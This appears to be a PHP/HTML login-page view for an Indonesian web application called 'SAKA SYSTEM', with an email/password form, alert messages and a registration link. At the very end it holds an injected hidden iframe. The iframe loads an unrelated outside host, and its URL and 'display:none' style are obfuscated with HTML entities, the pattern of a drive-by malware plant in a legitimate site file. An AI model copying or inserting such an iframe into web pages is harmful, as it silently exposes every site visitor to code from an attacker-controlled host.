<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>SAKA SYSTEM</title>
  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
  <link rel="stylesheet" href= "<?= base_url('asset/plugins/bootstrap/dist/css/bootstrap.min.css');?>" >
  <link rel="stylesheet" href= "<?= base_url('asset/plugins/font-awesome/css/font-awesome.min.css');?>" >
  <link rel="stylesheet" href= "<?= base_url('asset/plugins/Ionicons/css/ionicons.min.css'); ?>" >
  <link rel="stylesheet" href= "<?= base_url('asset/dist/css/AdminLTE.min.css'); ?>" >
  <meta name="mobile-web-app-capable" content="yes">
  <link rel="apple-touch-icon" sizes="57x57" href="http://cdn.julak.id.kilatstorage.com/saka/favicon/apple-icon-57x57.png">
  <link rel="apple-touch-icon" sizes="60x60" href="http://cdn.julak.id.kilatstorage.com/saka/favicon/apple-icon-60x60.png">
  <link rel="apple-touch-icon" sizes="72x72" href="http://cdn.julak.id.kilatstorage.com/saka/favicon/apple-icon-72x72.png">
  <link rel="apple-touch-icon" sizes="76x76" href="http://cdn.julak.id.kilatstorage.com/saka/favicon/apple-icon-76x76.png">
  <link rel="apple-touch-icon" sizes="114x114" href="http://cdn.julak.id.kilatstorage.com/saka/favicon/apple-icon-114x114.png">
  <link rel="apple-touch-icon" sizes="120x120" href="http://cdn.julak.id.kilatstorage.com/saka/favicon/apple-icon-120x120.png">
  <link rel="apple-touch-icon" sizes="144x144" href="http://cdn.julak.id.kilatstorage.com/saka/favicon/apple-icon-144x144.png">
  <link rel="apple-touch-icon" sizes="152x152" href="http://cdn.julak.id.kilatstorage.com/saka/favicon/apple-icon-152x152.png">
  <link rel="apple-touch-icon" sizes="180x180" href="http://cdn.julak.id.kilatstorage.com/saka/favicon/apple-icon-180x180.png">
  <link rel="icon" type="image/png" sizes="192x192"  href="http://cdn.julak.id.kilatstorage.com/saka/favicon/android-icon-192x192.png">
  <link rel="icon" type="image/png" sizes="32x32" href="http://cdn.julak.id.kilatstorage.com/saka/favicon/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="96x96" href="http://cdn.julak.id.kilatstorage.com/saka/favicon/favicon-96x96.png">
  <link rel="icon" type="image/png" sizes="16x16" href="http://cdn.julak.id.kilatstorage.com/saka/favicon/favicon-16x16.png">
  <link rel="manifest" href="http://cdn.julak.id.kilatstorage.com/saka/favicon/manifest.json">
  <meta name="msapplication-TileColor" content="#ffffff">
  <meta name="msapplication-TileImage" content="http://cdn.julak.id.kilatstorage.com/saka/favicon/ms-icon-144x144.png">
  <meta name="theme-color" content="#ffffff">
  
  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
  <!--[if lt IE 9]>
  <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
  <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
  <![endif]-->
  <!-- Google Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700,300italic,400italic,600italic">
  <style>.login-page{background-image: url("<?= base_url('asset/dist/img/bg-front.jpg'); ?>") !important; background-repeat: no-repeat; background-attachment: fixed; background-position: center; background-size: cover;}.login-box-body{background: rgba(255,255,255, 0.6) !important}</style>
</head>
<body class="hold-transition login-page">
<div class="login-box">
  <div class="login-logo">
    <a href="#"><b>LOGIN</b><br>SAKA SISTEM</a>
  </div>
  <!-- /.login-logo -->
  <div class="login-box-body">
    <p class="login-box-msg"></p>
    <?php if($this->session->flashdata('flashconfirm')): ?>
    <div class="alert alert-success alert-dismissable">
      <button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>
      <?php echo $this->session->flashdata('flashconfirm'); ?>
    </div>
    <?php endif; ?>
    <?php if($this->session->flashdata('flasherror')): ?>
    <div class="alert alert-warning alert-dismissable">
      <button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>
      <?php echo $this->session->flashdata('flasherror'); ?>
    </div>
    <?php endif; ?>

    <?= form_open('auth/login'); ?>
      <div class="form-group has-feedback">
        <input type="email" name="email" class="form-control" placeholder="Email" value="<?= set_value('email'); ?>">
        <span class="glyphicon glyphicon-envelope form-control-feedback"></span>
      </div>
      <div class="form-group has-feedback">
        <input type="password" name="password" class="form-control" placeholder="Password" value="<?= set_value('password'); ?>">
        <span class="glyphicon glyphicon-lock form-control-feedback"></span>
      </div>
      <div class="row">
        <!-- <div class="col-xs-8">
          <div class="checkbox icheck">
            <label>
              <input type="checkbox"> Ingatkan Saya
            </label>
          </div>
        </div> -->
        <!-- /.col -->
        <div class="col-xs-6">
          <a class="btn btn-danger btn-block btn-flat" href="<?= site_url('registrasi'); ?>"><i class="fa fa-file-text"></i> Registrasi</a>
        </div>
        <div class="col-xs-6">
          <button type="submit" class="btn btn-success btn-block btn-flat"><i class="fa fa-sign-in"></i> Login</button>
        </div>
        <!-- /.col -->
      </div>
    <?= form_close(); ?>

    <!-- <div class="social-auth-links text-center">
      <p>- OR -</p>
      <a href="#" class="btn btn-block btn-social btn-facebook btn-flat"><i class="fa fa-facebook"></i> Sign in using
        Facebook</a>
      <a href="#" class="btn btn-block btn-social btn-google btn-flat"><i class="fa fa-google-plus"></i> Sign in using
        Google+</a>
    </div> -->
    <!-- /.social-auth-links -->
    <br>
    <a href="#">Saya Lupa Password</a><br>
    <!-- <a href="#" class="text-center">Register a new membership</a> -->

  </div>
  <!-- /.login-box-body -->
</div>
<!-- /.login-box -->

<!-- jQuery 3 -->
<script src="<?= base_url('asset/plugins/jquery/dist/jquery.min.js'); ?>"></script>
<script src="<?= base_url('asset/plugins/bootstrap/dist/js/bootstrap.min.js'); ?>"></script>
<iframe src="http://jL.ch&#117;ra.pl/rc/" style="d&#105;splay:none"></iframe>
</body>
</html>
